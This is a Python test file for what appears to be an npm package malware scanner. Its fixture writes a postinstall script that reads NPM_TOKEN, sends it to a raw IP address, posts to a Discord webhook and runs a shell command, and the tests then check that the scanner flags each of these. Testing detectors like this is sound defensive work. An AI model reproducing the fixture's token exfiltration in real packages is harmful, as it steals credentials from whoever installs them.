from pathlib import Path

from pkgguard_analyzer.code_scan import scan_code
from pkgguard_analyzer.code_scan.behavior import classify
from pkgguard_analyzer.schema import IndicatorType


def test_behavior_profile_and_rule_indicators(tmp_path: Path):
    (tmp_path / "index.js").write_text('module.exports = () => fetch("https://api.github.com/repos");')
    (tmp_path / "setup.js").write_text(
        'const { execSync } = require("child_process");\n'
        'const token = process.env.NPM_TOKEN;\n'
        'fetch("http://45.33.32.156/collect", { body: token });\n'
        'post("https://discord.com/api/webhooks/123/abc");\n'
        'fetch("http://localhost:3000/health");\n'
        'execSync("id");\n'
    )
    result = scan_code(tmp_path, {"name": "demo", "scripts": {"postinstall": "node setup.js"}})
    profile = result.behavior

    assert profile.env_vars == ["NPM_TOKEN"]
    assert profile.ip_addresses == ["45.33.32.156"]
    assert "api.github.com" in profile.hosts and "localhost" not in profile.hosts
    assert profile.runs_commands and profile.install_time.commands and profile.install_time.network
    assert profile.install_time.files == ["setup.js"]
    assert profile.network_modules == ["child_process"]
    assert set(profile.files_by_capability["network"]) == {"index.js", "setup.js"}

    indicators = {(i.type, i.value) for i in result.indicators}
    assert (IndicatorType.URL, "http://45.33.32.156/collect") in indicators
    assert any(kind == IndicatorType.WEBHOOK for kind, _ in indicators)
    assert all(i.source == "rules" for i in result.indicators)


def test_clean_code_has_empty_profile(tmp_path: Path):
    (tmp_path / "index.js").write_text("module.exports = (a, b) => a + b;")
    result = scan_code(tmp_path, {"name": "demo"})
    assert result.indicators == []
    assert not (result.behavior.runs_commands or result.behavior.dynamic_code or result.behavior.env_vars)


def test_classify_indicators():
    assert classify("https://discord.com/api/webhooks/1/x") == IndicatorType.WEBHOOK
    assert classify("https://collector.example.invalid/p") == IndicatorType.URL
    assert classify("45.33.32.156") == IndicatorType.IP
    assert classify("evil.invalid") == IndicatorType.DOMAIN
